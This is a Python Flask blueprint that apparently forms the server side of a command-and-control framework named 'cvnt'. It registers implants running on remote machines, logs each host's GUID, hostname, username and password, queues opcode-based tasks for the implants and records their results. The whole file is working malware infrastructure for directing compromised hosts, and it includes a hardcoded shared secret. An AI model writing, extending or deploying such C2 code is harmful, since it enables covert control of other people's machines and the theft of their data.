# rpc blueprint - Implant <--> Server

from flask import Blueprint, request , abort 
from cvnt.implant_pb2 import * 
from cvnt.database import db
from cvnt.models import *
from flask_wtf.csrf import *

from constants import *

rpc = Blueprint("rpc", __name__)

password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!"

@rpc.route("/register", methods=["POST"])
def handle_register():
    reg_data = request.get_data()
    
    register = RegisterImplant()
    register.ParseFromString(reg_data)
    print(f'[+] New Implant:')
    print(f'[+]    * GUID: {register.GUID}')
    print(f'[+]    * Hostname: {register.Hostname}')
    print(f'[+]    * Username: {register.Username}')
    print(f'[+]    * Password: {register.Password}')
    
    if register.Password != password:
        abort(404)

    print(f'[+] Password is bueno.')

    r = register_implant(make_implant(register))

    # TODO If implant with same GUID has already been added, don't add and send failure back.
    # TODO If implant dies / kills itself, once last checkin expires, have Server remove said task from database
    print("[+] Watch out sexy ;) a New Implant connected!")
    return REGISTRATION_SUCCESSFUL

@rpc.route("/task/request", methods=["POST"])
def send_task():
    try:
        task_request = TaskRequest()
        task_request.ParseFromString(request.get_data())
        
        # Assuming the TaskRequest contains implant_id and other necessary details
        implant = Implant.query.get(task_request.implant_id)
        if not implant:
            return "Implant not found", 404
        
        # Create a new task entry
        new_task = make_task(
            id=None,
            task_id=task_request.task_id,
            status="created",
            implant_id=implant.id,
            task_opcode=task_request.opcode,
            task_args=task_request.args
        )
        db.session.add(new_task)
        db.session.commit()
        
        print(f"Task {new_task.task_id} sent to implant {implant.id}")
        return f"Task sent to implant {implant.id}", 200
    except Exception as e:
        print(f"Error sending task: {e}")
        return str(e), 500


@rpc.route("/task/response", methods=["POST"])
def receive_task_response():
    try:
        task_response = TaskResponse()
        task_response.ParseFromString(request.get_data())
        # Update the task status based on the response
        task = Task.query.filter_by(task_id=task_response.task_guid).first()
        if not task:
            return "Task not found", 404
        
        task.status = STATUS_TASK_COMPLETE if task_response.response else STATUS_TASK_FAILED
        db.session.commit()
        
        print(f"Received response for task {task.task_id} from implant {task.implant_id}")
        return f"Response received for task {task.task_id}", 200
    except Exception as e:
        print(f"Error receiving task response: {e}")
        return str(e), 500

'''
@rpc.route("/testpb", methods=["POST"])
def handle_pbtest():
    print(f'TEST PB ROUTE THING')
    register = RegisterImplant()
    req_data = request.get_data()
    register.ParseFromString(req_data)
    print(register)
    return ""
'''

